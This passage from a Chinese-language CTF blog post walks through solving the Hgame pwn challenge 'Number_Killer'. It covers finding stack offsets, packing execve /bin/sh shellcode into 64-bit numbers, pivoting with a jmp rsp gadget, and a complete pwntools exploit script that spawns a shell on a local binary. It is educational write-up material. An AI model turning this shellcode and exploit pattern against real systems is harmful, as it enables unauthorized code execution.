+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> string[<span style="color:#bd93f9">20</span>];
+</span></span><span style="display:flex;"><span>    temp <span style="color:#ff79c6">=</span> atol(str);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;十进制：%d&#34;</span>,str);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//printf(&#34;转换前：%s ,转换后：%d\n&#34;,str,atol(str));
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    temp <span style="color:#ff79c6">=</span> number;
+</span></span><span style="display:flex;"><span>    itoa(number, string, <span style="color:#bd93f9">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//printf(&#34;转换前：%d,转换后：%s&#34;,temp,string);
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span> <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127180305749.png" alt="image-20200127180305749">
+
+</p>
+<p>
+  <img src="/img/Hgame/image-20200127180319641.png" alt="image-20200127180319641">
+
+</p>
+<p>
+  <img src="/img/Hgame/image-20200127180517996.png" alt="image-20200127180517996">
+
+</p>
+<p>
+  <img src="/img/Hgame/image-20200127180441992.png" alt="image-20200127180441992">
+
+</p>
+<p>没有NX加上有jump rsp，那就肯定ret2shellcode</p>
+<p>因为atoll，所以不能直接发shellcode</p>
+<p>先看一下偏移</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">20</span>):
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127181655275.png" alt="image-20200127181655275">
+
+</p>
+<p>看见c,d,e,f,那里，再测一次</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">13</span>):
+</span></span><span style="display:flex;"><span>    sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127184537470.png" alt="image-20200127184537470">
+
+</p>
+<p>现在我们还看见了一个1，可能是用来记录循环次数的？</p>
+<p>然后我们要构建栈，就得按照</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gadget <span style="color:#ff79c6">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x000000000040078D</span>,<span style="color:#6272a4">#jmp rsp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x622fbf4856f63148</span>,<span style="color:#6272a4">#shellcode</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x545768732f2f6e69</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x0000050f993bb05f</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>这样来构建</p>
+<blockquote>
+<p>
+  <img src="/img/Hgame/image-20200127191618340.png" alt="image-20200127191618340">
+
+</p>
+</blockquote>
+<p>
+  <img src="/img/Hgame/image-20200127193319645.png" alt="image-20200127193319645">
+
+</p>
+<p>这样我们看见那个0，好像放在了最下面，并且栈中还存留有56789a，所以把gadget修改一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gadget <span style="color:#ff79c6">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x000000000040078D</span>,<span style="color:#6272a4">#jmp rsp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x622fbf4856f63148</span>,<span style="color:#6272a4">#shellcode</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x545768732f2f6e69</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x0000050f993bb05f</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>     <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127194207809.png" alt="image-20200127194207809">
+
+</p>
+<p>这样就没有问题啦，然后就是如何退出循环了</p>
+<p>这里我们可以看见循环次数已经变成了b
+  <img src="/img/Hgame/image-20200127195248873.png" alt="image-20200127195248873">
+
+</p>
+<p>但如果我们继续发送的话，又会变成1
+  <img src="/img/Hgame/image-20200127200302561.png" alt="image-20200127200302561">
+
+</p>
+<p>经过调试之后，只有<code>sendNum((11&lt;&lt;32))</code>可以将b+1变成c，否则会重新开始循环打乱栈内布局</p>
+<p>随后，发送</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">12</span>,<span style="color:#bd93f9">20</span>):
+</span></span><span style="display:flex;"><span>    sendNum(i)
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127202553944.png" alt="image-20200127202553944">
+
+</p>
+<p>然后发现立马就可以运行第一行&hellip;..</p>
+<p>我们需要把rbp指针指向之前我们放好了的地方，所以计算一下栈偏移，然后</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#ff79c6">=</span> asm(<span style="color:#f1fa8c">&#39;sub rsp,0x60;ret&#39;</span>)
+</span></span><span style="display:flex;"><span>b <span style="color:#ff79c6">=</span> disasm(a)
+</span></span></code></pre></div><p>
+  <img src="/img/Hgame/image-20200127205156957.png" alt="image-20200127205156957">
+
+</p>
+<p>所以发送<code>sendNum(0xc360ec8348)</code>再使用gitf里的
+  <img src="/img/Hgame/image-20200127205325792.png" alt="image-20200127205325792">
+
+</p>
+<p>完成跳转</p>
+<p>随后，程序还需要读入六个数，然后即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;./Number_Killer&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;numbers!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>gadget <span style="color:#ff79c6">=</span> [
+</span></span><span style="display:flex;"><span>       <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#bd93f9">0x000000000040078D</span>,<span style="color:#6272a4">#jmp rsp</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#bd93f9">0x622fbf4856f63148</span>,<span style="color:#6272a4">#shellcode</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#bd93f9">0x545768732f2f6e69</span>,
+</span></span><span style="display:flex;"><span>       <span style="color:#bd93f9">0x0000050f993bb05f</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xdeadbeef</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sendNum</span>(num):
+</span></span><span style="display:flex;"><span>   sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(num))
+</span></span><span style="display:flex;"><span>   sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">11</span>):
+</span></span><span style="display:flex;"><span>   sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>   sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> gadget:
+</span></span><span style="display:flex;"><span>   sendNum(i)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#pause()</span>
+</span></span><span style="display:flex;"><span>sendNum((<span style="color:#bd93f9">11</span><span style="color:#ff79c6">&lt;&lt;</span><span style="color:#bd93f9">32</span>))
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span>sendNum(<span style="color:#bd93f9">0xc360ec8348</span>)
+</span></span><span style="display:flex;"><span>sendNum(<span style="color:#bd93f9">0x400789</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">6</span>):
+</span></span><span style="display:flex;"><span>   sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>   sleep(<span style="color:#bd93f9">0.1</span>)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div>
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/pwn_by_examples/" data-toggle="tooltip" data-placement="top" title="pwn_by_examples">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/brainoverflow_vol.1_buu%E7%89%B9%E4%BE%9B/" data-toggle="tooltip" data-placement="top" title="BrainOverFlow_Vol.1_BUU特供">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
